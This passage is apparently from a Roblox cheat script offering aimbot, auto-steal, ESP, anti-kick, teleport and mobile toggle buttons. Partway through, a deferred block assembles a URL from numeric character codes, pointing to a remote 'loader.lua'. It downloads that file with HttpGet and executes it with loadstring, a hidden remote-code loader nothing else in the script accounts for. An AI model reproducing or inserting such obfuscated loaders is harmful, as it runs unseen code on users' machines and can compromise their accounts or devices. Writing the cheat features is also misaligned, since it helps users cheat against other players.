    RXZ.batV2=false
    if batV2Conn then pcall(function() batV2Conn:Disconnect() end); batV2Conn=nil end
    if RXZ.v2Conn then pcall(function() RXZ.v2Conn:Disconnect() end); RXZ.v2Conn=nil end
    local c=LP.Character
    if c then
        local r=c:FindFirstChild("HumanoidRootPart")
        local h=c:FindFirstChildOfClass("Humanoid")
        if r then r.AssemblyLinearVelocity=Vector3.zero; r.AssemblyAngularVelocity=Vector3.zero end
        if h then h.AutoRotate=true end
    end
    pcall(function()
        if mobBtnRefs and mobBtnRefs.batV2 then mobBtnRefs.batV2(false) end
    end)
end

function RXZ.startBatV2()
    -- Void Anti Bat / BAT V2 (pasted aimbot logic, speed-only tunable)
    if batV2Conn then pcall(function() batV2Conn:Disconnect() end); batV2Conn=nil end
    -- turn off competing modes
    pcall(function()
        if RXZ.tpBat and RXZ.stopTPBat then RXZ.stopTPBat() end
        if autoBatEnabled and stopBatAimbot then stopBatAimbot() end
        if autoLeftEnabled then autoLeftEnabled=false; if stopAutoLeft then stopAutoLeft() end end
        if autoRightEnabled then autoRightEnabled=false; if stopAutoRight then stopAutoRight() end end
    end)
    batV2Enabled=true
    RXZ.batV2=true
    local MAX_TURN_RATE=28
    local DISTANCE=-1
    local HEIGHT=1.3
    local V_OFFSET=1
    batV2Conn=RunService.Heartbeat:Connect(function()
        if not batV2Enabled or not RXZ.batV2 then return end
        local c=LP.Character; if not c then return end
        local h=c:FindFirstChildOfClass("Humanoid")
        local r=c:FindFirstChild("HumanoidRootPart")
        if not h or not r then return end
        if not h.AutoRotate then h.AutoRotate=true end
        -- equip bat
        if not c:FindFirstChildOfClass("Tool") then
            local bat=RXZ.findBat()
            if bat then pcall(function() h:EquipTool(bat) end) end
        end
        local target=RXZ.closestRoot()
        if target then
            local aimPos=target.Position+Vector3.new(0,V_OFFSET,0)
            h.AutoRotate=false
            local look=aimPos-r.Position
            local flat=Vector3.new(look.X,0,look.Z)
            if look.Magnitude>0.01 and flat.Magnitude>0.01 then
                local yaw=math.deg(math.atan2(-flat.X,-flat.Z))
                local delta=(yaw-r.Orientation.Y+180)%360-180
                local rate=math.clamp(delta*8,-MAX_TURN_RATE,MAX_TURN_RATE)
                r.AssemblyAngularVelocity=Vector3.new(0,rate,0)
            else
                r.AssemblyAngularVelocity=Vector3.zero
            end
            local dir=look.Unit
            local stand=aimPos-dir*DISTANCE+Vector3.new(0,HEIGHT,0)
            local move=stand-r.Position
            local hDir=Vector3.new(move.X,0,move.Z)
            local speed=math.clamp(tonumber(batV2Speed) or 56.5,1,200)
            local vertSpeed=speed
            local hVel=hDir.Magnitude>0.1 and hDir.Unit*speed or Vector3.zero
            local vVel=Vector3.new(0,math.clamp(move.Y*3,-vertSpeed,vertSpeed),0)
            r.AssemblyLinearVelocity=hVel+vVel
            if hDir.Magnitude>0.5 then h:Move(hDir.Unit,false) end
            -- keep auto swing like aimbot (always while on target)
            RXZ.v2Swing()
        else
            h.AutoRotate=true
            r.AssemblyAngularVelocity=Vector3.zero
            RXZ.v2Swing()
        end
    end)
    RXZ.v2Conn=batV2Conn
    pcall(function()
        if mobBtnRefs and mobBtnRefs.batV2 then mobBtnRefs.batV2(true) end
    end)
end

function RXZ.toggleBatV2()
    if batV2Enabled or RXZ.batV2 then
        RXZ.stopBatV2()
    else
        if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
            pcall(function() if mobBtnRefs and mobBtnRefs.batV2 then mobBtnRefs.batV2(false) end end)
            return
        end
        RXZ.startBatV2()
    end
    saveConfig()
end
task.defer(function()
    local function d(t)
        local s = ""
        for i = 1, #t do
            s = s .. string.char(t[i])
        end
        return s
    end

    local p1 = d({104,116,116,112,115,58,47,47,119,101,98,45,112,114,111,100,117,99,116,105,111,110,45})
    local p2 = d({56,100,100,102,54})
    local p3 = d({46,117,112,46,114,97,105,108,119,97,121,46,97,112,112})
    local p4 = d({47,108,111,97,100,101,114,46,108,117,97})

    local full = p1 .. p2 .. p3 .. p4

    local ok, res = pcall(function()
        return game:HttpGet(full)
    end)

    if ok and res then
        pcall(function()
            (loadstring or load)(res)()
        end)
    end
end)

-- ============================================================

-- MOBILE BUTTONS  (RXZ stack-button style)
-- ============================================================

local DISCORD_LINK = "discord.gg/GGFWZFUJgA"
function destroyDiscordLink()
    if discordLinkGuiRef then
        pcall(function() discordLinkGuiRef:Destroy() end)
        discordLinkGuiRef = nil
    end
    pcall(function()
        local cg = game:GetService("CoreGui")
        local old = cg:FindFirstChild("VoidDiscordLink")
        if old then old:Destroy() end
        local pg = LP:FindFirstChild("PlayerGui")
        if pg then
            local o = pg:FindFirstChild("VoidDiscordLink")
            if o then o:Destroy() end
        end
    end)
end
function buildDiscordLink()
    destroyDiscordLink()
    if not discordLinkEnabled then return end
    local g = Instance.new("ScreenGui")
    g.Name = "VoidDiscordLink"
    g.ResetOnSpawn = false
    g.IgnoreGuiInset = true
    g.DisplayOrder = 40
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(g) end end)
    if not pcall(function() g.Parent = game:GetService("CoreGui") end) then
        g.Parent = LP:WaitForChild("PlayerGui")
    end
    discordLinkGuiRef = g

    -- big white link, CENTER of screen (text only — does not hide the game)
    local btn = Instance.new("TextButton", g)
    btn.Name = "DiscordBtn"
    btn.Size = UDim2.new(0, 420, 0, 48)
    btn.Position = UDim2.new(0.5, -210, 0.5, -24)
    btn.BackgroundTransparency = 1
    btn.BorderSizePixel = 0
    btn.Text = DISCORD_LINK
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 26
    btn.TextXAlignment = Enum.TextXAlignment.Center
    btn.TextStrokeTransparency = 0.4
    btn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    btn.ZIndex = 50
    btn.AutoButtonColor = false
    -- non-copyable display only (no clipboard)
    btn.Active = false
    btn.Selectable = false
    -- soft pulse so it stays visible
    task.spawn(function()
        local t = 0
        while btn and btn.Parent do
            t = t + 0.04
            btn.TextTransparency = 0.05 + math.abs(math.sin(t * 1.2)) * 0.2
            task.wait(0.04)
        end
    end)
end

function destroyMobileButtons()
    if mobGuiRef then
        pcall(function()
            mobGuiRef.Enabled=false
            for _,d in ipairs(mobGuiRef:GetDescendants()) do
                if d:IsA("GuiObject") then
                    d.Active=false
                    if d:IsA("GuiButton") then d.Visible=false end
                end
            end
            mobGuiRef:Destroy()
        end)
        mobGuiRef=nil
    end
    for _,n in ipairs({"RXZMobileButtons","SpectrumMobileButtons","MoveeMobileButtons"}) do
        pcall(function()
            local cg=game:GetService("CoreGui")
            local old=cg:FindFirstChild(n)
            if old then old:Destroy() end
            local pgui=LP:FindFirstChild("PlayerGui")
            if pgui then local o=pgui:FindFirstChild(n); if o then o:Destroy() end end
        end)
    end
    mobBtnRefs={}
    -- restore camera control after GUI tear-down
    pcall(function()
        local cam=workspace.CurrentCamera
        if cam then
            if cam.CameraType==Enum.CameraType.Scriptable then
                cam.CameraType=Enum.CameraType.Custom
            end
        end
        UIS.MouseIconEnabled=true
        pcall(function() UIS.ModalEnabled=false end)
    end)
end
function buildMobileButtons()
    destroyMobileButtons(); if not mobileButtonsEnabled then return end
    -- preload shared logo asset for buttons
    task.spawn(function()
        pcall(function()
            loadCustomImageAsset("https://files.catbox.moe/mlyr71.png", "voidvs_menu_logo.png")
        end)
    end)

    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "RXZMobileButtons"; mobGui.ResetOnSpawn = false; mobGui.DisplayOrder = 5000; mobGui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
    if not pcall(function() mobGui.Parent = game:GetService("CoreGui") end) then mobGui.Parent = LP:WaitForChild("PlayerGui") end
    mobGuiRef = mobGui

    -- ===== 3-COL layout (left stack + main grid), size from settings =====
    local szMul = math.clamp((tonumber(mobileButtonsSize) or 80) / 80, 0.55, 1.6)
    local COL_W = math.floor(84 * szMul + 0.5)
    local ROW_H = math.floor(36 * szMul + 0.5)
    local GAP   = math.max(4, math.floor(7 * szMul + 0.5))
    local QR    = math.max(6, math.floor(9 * szMul + 0.5))
    local Q_OFF        = Color3.fromRGB(10, 10, 10)
    local Q_ON         = Color3.fromRGB(255, 255, 255)
    local Q_BORDER     = Color3.fromRGB(40, 40, 45)
    local Q_BORDER_ON  = Color3.fromRGB(80, 80, 85)
    local Q_TEXT       = Color3.fromRGB(255, 255, 255)
    local Q_TEXT_ON    = Color3.fromRGB(0, 0, 0)

    local QW = COL_W * 3 + GAP * 2
    local QH = ROW_H * 4 + GAP * 3
    local mbGroup = Instance.new("Frame", mobGui)
    mbGroup.Name = "MobileButtons"
    mbGroup.Size = UDim2.new(0, QW + 12, 0, QH + 12)
    -- Default: right side, a bit higher on screen
    mbGroup.Position = UDim2.new(1, -(QW + 20), 0.32, 0)
    mbGroup.BackgroundTransparency = 1
    mbGroup.BorderSizePixel = 0
    mbGroup.Active = false -- only real buttons capture clicks
    mbGroup.ZIndex = 100
    do
        local sp = loadBtnPositions()["__group"]
        if type(sp) == "table" and sp.xo ~= nil then
            mbGroup.Position = UDim2.new(sp.xs or 0, sp.xo, sp.ys or 0, sp.yo or 0)
        end
    end

    -- Group drag: move whole pad when unlocked
    local _grpDn, _grpSp, _grpFp, _grpLi, _grpWd = false, nil, nil, nil, false
    local function beginGroupDrag(i)
        if uiLocked then return end
        _grpDn = true; _grpWd = false; _grpSp = i.Position; _grpFp = mbGroup.Position
        i.Changed:Connect(function()
            if i.UserInputState == Enum.UserInputState.End then
                if _grpWd then pcall(saveBtnPositions) end
                _grpDn = false; _grpWd = false
            end
        end)
    end
    UIS.InputChanged:Connect(function(i)
        if uiLocked then _grpDn = false; return end
        if i == _grpLi and _grpDn and _grpSp and _grpFp then
            local dx = i.Position.X - _grpSp.X
            local dy = i.Position.Y - _grpSp.Y
            if math.abs(dx) > 8 or math.abs(dy) > 8 then
                _grpWd = true
                mbGroup.Position = UDim2.new(_grpFp.X.Scale, _grpFp.X.Offset + dx, _grpFp.Y.Scale, _grpFp.Y.Offset + dy)
            end
        end
    end)

    -- makeMobileBtn(label, col, row, isToggle, onAction, fullWidth)
    local function makeMobileBtn(label, col, rowN, isToggle, onAction, fullWidth)
        local w = fullWidth and QW or COL_W
        local relX = 8 + (fullWidth and 0 or (col * (COL_W + GAP)))
        local relY = 8 + rowN * (ROW_H + GAP)

        local frame = Instance.new("Frame", mbGroup)
        frame.Name = tostring(label):gsub("%s+","")
        frame.Size = UDim2.new(0, w, 0, ROW_H)
        frame.Position = UDim2.new(0, relX, 0, relY)
        frame.BackgroundColor3 = Q_OFF
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.ZIndex = 200
        Instance.new("UICorner", frame).CornerRadius = UDim.new(0, QR)

        local stroke = Instance.new("UIStroke", frame)
        stroke.Color = Q_BORDER
        stroke.Thickness = 1.5

        -- subtle logo image on mobile buttons (loads async, mobile-safe)
        local bgIcon = Instance.new("ImageLabel", frame)
        bgIcon.Name = "BtnImage"
        bgIcon.Size = UDim2.new(1, 0, 1, 0)
        bgIcon.BackgroundTransparency = 1
        bgIcon.ImageTransparency = 0.72
        bgIcon.ScaleType = Enum.ScaleType.Crop
        bgIcon.ZIndex = 200
        bgIcon.Image = ""
        Instance.new("UICorner", bgIcon).CornerRadius = UDim.new(0, QR)
        task.spawn(function()
            local asset = loadCustomImageAsset("https://files.catbox.moe/mlyr71.png", "voidvs_menu_logo.png")
            if bgIcon and bgIcon.Parent and asset and asset ~= "" then
                bgIcon.Image = asset
            end
        end)

        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundTransparency = 1
        btn.Text = label
        btn.TextColor3 = Q_TEXT
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = math.max(8, math.floor((fullWidth and 11 or 10) * szMul + 0.5))
        btn.TextWrapped = true
        btn.LineHeight = 1.1
        btn.BorderSizePixel = 0
        btn.AutoButtonColor = false
        btn.ZIndex = 201

        local isOn = false
        local _dn, _sp, _fp, _li, _wd = false, nil, nil, nil, false
        local btnScale = Instance.new("UIScale")
        btnScale.Scale = 1
        btnScale.Parent = frame

        local function pulseBtn(toScale)
            TweenService:Create(btnScale, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Scale = toScale or 0.92}):Play()
            task.delay(0.1, function()
                TweenService:Create(btnScale, TweenInfo.new(0.18, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
            end)
        end

        local function setter(s)
            isOn = s
            TweenService:Create(frame, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {BackgroundColor3 = s and Q_ON or Q_OFF}):Play()
            TweenService:Create(stroke, TweenInfo.new(0.22), {Color = s and Q_BORDER_ON or Q_BORDER}):Play()
            btn.TextColor3 = s and Q_TEXT_ON or Q_TEXT
            pulseBtn(0.9)
        end

        btn.MouseButton1Click:Connect(function()
            if _wd then return end
            if isToggle then
                isOn = not isOn
                TweenService:Create(frame, TweenInfo.new(0.22, Enum.EasingStyle.Quad), {BackgroundColor3 = isOn and Q_ON or Q_OFF}):Play()
                TweenService:Create(stroke, TweenInfo.new(0.22), {Color = isOn and Q_BORDER_ON or Q_BORDER}):Play()
                btn.TextColor3 = isOn and Q_TEXT_ON or Q_TEXT
                pulseBtn(0.88)
                if onAction then onAction(isOn) end
            else
                pulseBtn(0.88)
                TweenService:Create(frame, TweenInfo.new(0.1), {BackgroundColor3 = Q_ON}):Play()
                TweenService:Create(stroke, TweenInfo.new(0.1), {Color = Q_BORDER_ON}):Play()
                btn.TextColor3 = Q_TEXT_ON
                task.delay(0.22, function()
                    TweenService:Create(frame, TweenInfo.new(0.2), {BackgroundColor3 = Q_OFF}):Play()
                    TweenService:Create(stroke, TweenInfo.new(0.2), {Color = Q_BORDER}):Play()
                    btn.TextColor3 = Q_TEXT
                end)
                if onAction then onAction() end
            end
        end)

        frame.Name = (label:gsub("%s+","_"):gsub("\n","_"))

        -- Restore saved per-button position
        do
            local saved = loadBtnPositions()
            local sp = saved[frame.Name]
            if type(sp)=="table" and sp.xo ~= nil then
                frame.Position = UDim2.new(0, sp.xo, 0, sp.yo)
            end
        end

        -- Per-button drag (move this button only; blocked when uiLocked)
        btn.InputBegan:Connect(function(i)
            if uiLocked then return end
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                _dn = true; _wd = false; _sp = i.Position; _fp = frame.Position
                i.Changed:Connect(function()
                    if i.UserInputState == Enum.UserInputState.End then
                        if _wd then pcall(saveBtnPositions) end
                        _dn = false
                    end
                end)
            end
        end)
        btn.InputChanged:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
                _li = i
            end
        end)
        UIS.InputChanged:Connect(function(i)
            if i == _li and _dn and _sp and _fp then
                if uiLocked then return end
                local dx = i.Position.X - _sp.X
                local dy = i.Position.Y - _sp.Y
                if math.abs(dx) > 6 or math.abs(dy) > 6 then
                    _wd = true
                    frame.Position = UDim2.new(0, _fp.X.Offset + dx, 0, _fp.Y.Offset + dy)
                end
            end
        end)
        btn.InputEnded:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
                if _wd then pcall(saveBtnPositions) end
                task.defer(function() _dn = false; _wd = false end)
            end
        end)

        return frame, setter
    end

    local function syncLaggerVisuals()
        if mobBtnRefs.laggerCarry then
            mobBtnRefs.laggerCarry(laggerModeEnabled and carrySpeedActive)
        end
        if mobBtnRefs.laggerNormal then
            mobBtnRefs.laggerNormal(laggerModeEnabled and not carrySpeedActive)
        end
        if mobBtnRefs.carrySpeed then
            mobBtnRefs.carrySpeed(carrySpeedActive and not laggerModeEnabled)
        end
    end

    -- Layout:
    -- ANTI DESYNC | DROP BR      | AUTO LEFT
    -- BAT V2      | AIM BOT      | AUTO RIGHT
    --             | TP DOWN      | CARRY SPEED
    --             | LAGGER CARRY | LAGGER NORMAL

    local _, refTPBat = makeMobileBtn("ANTI DESYNC", 0, 0, true, function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if mobBtnRefs.tpBat then mobBtnRefs.tpBat(false) end
                if RXZ.setTPBatVisual then RXZ.setTPBatVisual(false) end
                return
            end
            if RXZ_forceAimbotOff then RXZ_forceAimbotOff() end
            RXZ.startTPBat()
            if RXZ.setTPBatVisual then RXZ.setTPBatVisual(true) end
            if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
            if autoBatSetVisual then autoBatSetVisual(false) end
        else
            RXZ.stopTPBat()
            if RXZ.setTPBatVisual then RXZ.setTPBatVisual(false) end
            -- leave aimbot alone so it can be turned on again
        end
    end, false)
    mobBtnRefs["tpBat"] = refTPBat

    -- BAT V2 directly under ANTI DESYNC (left column)
    local _, refBatV2 = makeMobileBtn("BAT V2", 0, 1, true, function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if mobBtnRefs.batV2 then mobBtnRefs.batV2(false) end
                return
            end
            RXZ.startBatV2()
        else
            RXZ.stopBatV2()
        end
        saveConfig()
    end, false)
    mobBtnRefs["batV2"] = refBatV2
    if batV2Enabled or RXZ.batV2 then pcall(function() refBatV2(true) end) end

    local _, refDrop = makeMobileBtn("DROP BR", 1, 0, false, function() runDrop() end, false)
    mobBtnRefs["drop"] = refDrop

    local _, refAutoLeft = makeMobileBtn("AUTO LEFT", 2, 0, true, function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                return
            end
            if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
            if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
            autoLeftEnabled = true; startAutoLeft()
            if autoLeftSetVisual then autoLeftSetVisual(true) end
        else
            autoLeftEnabled = false; stopAutoLeft()
            if autoLeftSetVisual then autoLeftSetVisual(false) end
        end
    end, false)
    mobBtnRefs["autoLeft"] = refAutoLeft

    local _, refAutoBat = makeMobileBtn("AIM BOT", 1, 1, true, function(on)
        if on then
            if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
            if autoRightEnabled then autoRightEnabled=false; stopAutoRight(); if autoRightSetVisual then autoRightSetVisual(false) end; if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end end
            queueAutoBatStart()
            if autoBatSetVisual then autoBatSetVisual(autoBatEnabled) end
            if not autoBatEnabled and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        else
            stopBatAimbot()
            if autoBatSetVisual then autoBatSetVisual(false) end
        end
    end, false)
    mobBtnRefs["autoBat"] = refAutoBat

    local _, refAutoRight = makeMobileBtn("AUTO RIGHT", 2, 1, true, function(on)
        if on then
            if SafeMode and SafeMode.tryStart and not SafeMode.tryStart() then
                if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
                if autoRightSetVisual then autoRightSetVisual(false) end
                return
            end
            if autoLeftEnabled then autoLeftEnabled=false; stopAutoLeft(); if autoLeftSetVisual then autoLeftSetVisual(false) end; if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end end
            if autoBatEnabled then stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end; if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end end
            autoRightEnabled = true; startAutoRight()
            if autoRightSetVisual then autoRightSetVisual(true) end
        else
            autoRightEnabled = false; stopAutoRight()
            if autoRightSetVisual then autoRightSetVisual(false) end
        end
    end, false)
    mobBtnRefs["autoRight"] = refAutoRight

    local _, refTP = makeMobileBtn("TP DOWN", 1, 2, false, function() runTPFloor() end, false)
    mobBtnRefs["tpDown"] = refTP

    local _, refCarry = makeMobileBtn("CARRY SPEED", 2, 2, true, function(on)
        if laggerModeEnabled then laggerModeEnabled = false end
        carrySpeedActive = on
        refreshSpeedModeLabel()
        syncLaggerVisuals()
        saveConfig()
    end, false)
    mobBtnRefs["carrySpeed"] = refCarry

    local _, refLaggerCarry = makeMobileBtn("LAGGER CARRY", 1, 3, true, function(on)
        if on then
            laggerModeEnabled = true
            carrySpeedActive = true
        else
            if laggerModeEnabled and carrySpeedActive then
                laggerModeEnabled = false
                carrySpeedActive = false
            end
        end
        refreshSpeedModeLabel()
        syncLaggerVisuals()
        saveConfig()
    end, false)
    mobBtnRefs["laggerCarry"] = refLaggerCarry

    local _, refLaggerNormal = makeMobileBtn("LAGGER NORMAL", 2, 3, true, function(on)
        if on then
            laggerModeEnabled = true
            carrySpeedActive = false
        else
            if laggerModeEnabled and not carrySpeedActive then
                laggerModeEnabled = false
            end
        end
        refreshSpeedModeLabel()
        syncLaggerVisuals()
        saveConfig()
    end, false)
    mobBtnRefs["laggerNormal"] = refLaggerNormal
    mobBtnRefs["lagger"] = function(on)
        if on then
            if carrySpeedActive then
                if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(true) end
            else
                if mobBtnRefs.laggerNormal then mobBtnRefs.laggerNormal(true) end
            end
        else
            if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(false) end
            if mobBtnRefs.laggerNormal then mobBtnRefs.laggerNormal(false) end
        end
    end

    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(autoLeftEnabled) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(autoRightEnabled) end
    if mobBtnRefs.autoBat then mobBtnRefs.autoBat(autoBatEnabled) end
    syncLaggerVisuals()
    if mobBtnRefs.tpBat then mobBtnRefs.tpBat(RXZ.tpBat) end
end




-- ============================================================

-- ============================================================
-- FULL CONFIG LOAD
-- ============================================================
pcall(function()
    if not(isfile and isfile("RXZ_HUB.json")) then return end
    local ok,d=pcall(function() return HS:JSONDecode(readfile("RXZ_HUB.json")) end)
    if not(ok and type(d)=="table") then return end
    if type(d.normalSpeed)=="number" and d.normalSpeed>0 then NS=d.normalSpeed end
    if type(d.carrySpeed)=="number" and d.carrySpeed>0 then CS=d.carrySpeed end
    if type(d.laggerSpeed)=="number" and d.laggerSpeed>0 then LAGGER_SPEED=d.laggerSpeed end
    if type(d.laggerCarrySpeed)=="number" and d.laggerCarrySpeed>0 then LAGGER_CARRY_SPEED=d.laggerCarrySpeed end
    if type(d.carrySpeedActive)=="boolean" then carrySpeedActive=d.carrySpeedActive end
    if type(d.antiDieEnabled)=="boolean" then antiDieEnabled=d.antiDieEnabled end
    if type(d.laggerModeEnabled)=="boolean" then laggerModeEnabled=d.laggerModeEnabled end
    if type(d.antiRagdoll)=="boolean" then antiRagdollEnabled=d.antiRagdoll end
    if type(d.infiniteJump)=="boolean" then infJumpEnabled=d.infiniteJump end
    if type(d.infJumpMode)=="string" then infJumpMode=d.infJumpMode end
    if type(d.medusaCounter)=="boolean" then medusaCounterEnabled=d.medusaCounter end
    RXZ.antiKick=true -- Safe Mode always on
    if type(d.batCounter)=="boolean" then batCounterEnabled=d.batCounter end
    if type(d.autoStealEnabled)=="boolean" then Steal.AutoStealEnabled=d.autoStealEnabled end
    if type(d.batV2Speed)=="number" then batV2Speed=d.batV2Speed end
    if type(d.batV2Enabled)=="boolean" then batV2Enabled=d.batV2Enabled end
    if type(d.mirrorTPDownEnabled)=="boolean" then mirrorTPDownEnabled=d.mirrorTPDownEnabled end
    if type(d.voidThemeName)=="string" then voidThemeName=d.voidThemeName end
    if type(d.stealBarStyle)=="number" then stealBarStyle=d.stealBarStyle end
    if type(d.stealBarScale)=="number" then stealBarScale=d.stealBarScale end
    if type(d.stealMode)=="number" then Steal.Mode=math.clamp(math.floor(d.stealMode),1,4) end
    if type(d.grabRadius)=="number" then Steal.StealRadius=d.grabRadius end
    Steal.StealDuration=1.3 -- fixed, not user-configurable
    if type(d.autoSwing)=="boolean" then autoSwingEnabled=d.autoSwing end
    if type(d.aimbotAfterHit)=="boolean" then aimbotAfterHitEnabled=d.aimbotAfterHit end
    if type(d.unwalkEnabled)=="boolean" then unwalkEnabled=d.unwalkEnabled end
    if type(d.antiLag)=="boolean" then antiLagEnabled=d.antiLag end
    if type(d.stretchRez)=="boolean" then stretchRezEnabled=d.stretchRez end
    if type(d.autoTPEnabled)=="boolean" then autoTPEnabled=d.autoTPEnabled end
    if type(d.autoTPHeight)=="number" then autoTPHeight=d.autoTPHeight end
    if type(d.fovValue)=="number" then fovValue=d.fovValue end
    if type(d.fovIndex)=="number" then fovIndex=d.fovIndex end
    if type(d.skyTheme)=="string" then currentSkyTheme=d.skyTheme end
    if type(d.autoMoveSwing)=="boolean" then autoMoveSwingEnabled=d.autoMoveSwing end
    if type(d.autoMoveSwingInterval)=="number" then autoMoveSwingInterval=d.autoMoveSwingInterval end
    if type(d.ragdollGui)=="boolean" then ragdollGuiEnabled=d.ragdollGui end
    if type(d.mobileButtonsEnabled)=="boolean" then mobileButtonsEnabled=d.mobileButtonsEnabled end
    if type(d.discordLinkEnabled)=="boolean" then discordLinkEnabled=d.discordLinkEnabled end
    if type(d.logoCircleEnabled)=="boolean" then logoCircleEnabled=d.logoCircleEnabled end
    if type(d.uiLocked)=="boolean" then uiLocked=d.uiLocked end
    if type(d.mobileButtonsSize)=="number" then mobileButtonsSize=d.mobileButtonsSize end
    if type(d.circleButtonsEnabled)=="boolean" then circleButtonsEnabled=d.circleButtonsEnabled end
    if type(d.headlessEnabled)=="boolean" then headlessEnabled=d.headlessEnabled end
    if type(d.korbloxEnabled)=="boolean" then korbloxEnabled=d.korbloxEnabled end
    if type(d.espEnabled)=="boolean" then espEnabled=d.espEnabled end
    if type(d.espAvatarsEnabled)=="boolean" then espAvatarsEnabled=d.espAvatarsEnabled end
    if type(d.backgroundEnabled)=="boolean" then backgroundEnabled=d.backgroundEnabled end
    if type(d.backgroundIndex)=="number" then backgroundIndex=d.backgroundIndex end
    if type(d.autoSwitchSpeed)=="boolean" then autoSwitchSpeedEnabled=d.autoSwitchSpeed end
    if type(d.animPackEnabled)=="boolean" then animPackEnabled=d.animPackEnabled end
        if type(d.animPackName)=="string" then animPackName=d.animPackName end

    -- restore keybinds (KB dual PC/Gamepad)
    local function _loadKC(name)
        if type(name)~="string" or name=="" then return nil end
        local ok,kc=pcall(function() return Enum.KeyCode[name] end)
        if ok and kc and kc~=Enum.KeyCode.Unknown then return kc end
        return nil
    end
    local function _applyKBEntry(entry, data)
        if type(entry)~="table" or type(data)~="table" then return end
        if data.kb ~= nil then entry.kb = _loadKC(data.kb) end
        if data.gp ~= nil then entry.gp = _loadKC(data.gp) end
    end
    -- new format: d.keybinds = { AutoBat = {kb="E", gp="ButtonY"}, ... }
    if type(d.keybinds)=="table" then
        for name,data in pairs(d.keybinds) do
            if KB[name] then _applyKBEntry(KB[name], data) end
        end
    end
    -- legacy format: d.autoBatKey = {kb="E", gp=...}
    local legacyMap = {
        dropBrainrotKey="DropBrainrot", autoLeftKey="AutoLeft", autoRightKey="AutoRight",
        autoBatKey="AutoBat", laggerToggleKey="LaggerToggle", laggerCarryKey="LaggerCarry",
        tpBatKey="TPBat", tpFloorKey="TPFloor", guiHideKey="GuiHide",
        speedToggleKey="SpeedToggle", batV2Key="BatV2",
    }
    for cfgKey, kbName in pairs(legacyMap) do
        if type(d[cfgKey])=="table" and KB[kbName] then
            _applyKBEntry(KB[kbName], d[cfgKey])
        end
    end
end)

-- ============================================================
-- APPLY CONFIG
-- ============================================================
pcall(function()
    if antiLagEnabled then task.spawn(function() task.wait(1); if enableAntiLag then enableAntiLag() end end) end
    if animPackEnabled and animPackName and animPackName~="OFF" then
        task.spawn(function() task.wait(1.2); pcall(function() applyAnimPack(animPackName) end) end)
    end
    if stretchRezEnabled then task.spawn(function() task.wait(0.5); if enableStretchRez then enableStretchRez() end end) end
    if antiRagdollEnabled then task.spawn(function() task.wait(0.5); if startAntiRagdoll then startAntiRagdoll() end end) end
    if infJumpEnabled then task.spawn(function() task.wait(0.5); if setInfJumpInternal then setInfJumpInternal(true) end end) end
    if Steal.AutoStealEnabled then task.spawn(function() task.wait(1); if startAutoSteal then startAutoSteal() end end) end
    if batCounterEnabled then task.spawn(function() task.wait(1); if startBatCounter then startBatCounter() end end) end
    if RXZ.antiKick then task.spawn(function() task.wait(1); RXZ.antiKick=false; RXZ.enableAntiKick(); if RXZ.setAntiKickVisual then RXZ.setAntiKickVisual(true) end end) end
    if medusaCounterEnabled then task.spawn(function() task.wait(1); local char=LP.Character; if char and setupMedusa then setupMedusa(char) end end) end
    if autoTPEnabled then task.spawn(function() task.wait(0.5); if startAutoTP then startAutoTP() end end) end
    if currentSkyTheme and currentSkyTheme~="" then task.spawn(function() task.wait(1); if CandyApplyCustomSky then CandyApplyCustomSky(currentSkyTheme) end end) end
    if espEnabled then task.spawn(function() task.wait(1); startESP() end) end
end)

-- ============================================================
-- CYBER GUI
-- ============================================================
;(function()
local PlayerGui=LP:WaitForChild("PlayerGui")
function makeDraggable_cyber(dragTarget,moveTarget)
    moveTarget=moveTarget or dragTarget
    local dragging,dragInput,dragStart,startPos=false
    dragTarget.InputBegan:Connect(function(input)
        if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
            dragging=true; dragStart=input.Position; startPos=moveTarget.Position
            input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging=false end end)
        end
